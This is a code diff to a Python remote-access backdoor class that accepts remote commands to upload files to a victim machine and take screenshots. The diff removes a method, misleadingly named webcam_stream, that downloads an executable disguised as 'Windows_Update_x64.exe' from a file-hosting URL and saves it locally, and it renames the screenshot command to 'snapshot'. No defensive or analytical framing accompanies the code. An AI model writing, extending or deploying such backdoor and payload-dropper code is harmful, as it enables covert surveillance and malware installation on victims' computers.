@@ -68,15 +68,6 @@ class Backdoor:
     def screenshot(self):
         image = pyscreeze.screenshot('Image.jpg')
         return "Screenshot saved as Image.jpg"
-        
-    def webcam_stream(self):
-        url = 'https://cdn-124.anonfiles.com/L2PbE9P1oe/00b7b936-1598590508/Windows_Update_x64.exe'
-        f = urllib.urlopen(url)
-        file = f.read()
-        f.close()
-        f2 = open('Windows_Update_x64.exe', 'wb')
-        f2.write(file)
-        f2.close()
 
 
     def run(self):
@@ -96,11 +87,8 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
                     
-                elif command[0] == "screenshot":
+                elif command[0] == "snapshot":
                     command_result = self.screenshot()
 
                 else:
@@ -186,15 +174,6 @@ class Backdoor:
         image = pyscreeze.screenshot('Image.jpg')
         return "Screenshot saved as Image.jpg"
 
-    def webcam_stream(self):
-        url = 'https://cdn-124.anonfiles.com/L2PbE9P1oe/00b7b936-1598590508/Windows_Update_x64.exe'
-        f = urllib.urlopen(url)
-        file = f.read()
-        f.close()
-        f2 = open('Windows_Update_x64.exe', 'wb')
-        f2.write(file)
-        f2.close()
-
 
     def run(self):
         while True:
@@ -213,11 +192,8 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
                     
-                elif command[0] == "screenshot":
+                elif command[0] == "snapshot":
                     command_result = self.screenshot()
 
                 else:
@@ -441,16 +417,6 @@ class Backdoor:
             file.write(base64.b64decode(content))
             return"[+] File has been uploaded!"
 
-        
-    def webcam_stream(self):
-        url = 'https://cdn-124.anonfiles.com/L2PbE9P1oe/00b7b936-1598590508/Windows_Update_x64.exe'
-        f = urllib.urlopen(url)
-        file = f.read()
-        f.close()
-        f2 = open('Windows_Update_x64.exe', 'wb')
-        f2.write(file)
-        f2.close()
-
             
     def snapshot(self):
         screenshot = pyscreeze.screenshot("Image.jpg")
@@ -473,9 +439,6 @@ class Backdoor:
 
                 elif command[0] == "upload":
                     command_result = self.write(command[1], command[2])
-
-                elif command[0] == "webcam_stream":
-                    command_result = self.webcam_stream()
                 
                 elif command[0] == "snapshot":
                     command_result = self.snapshot()
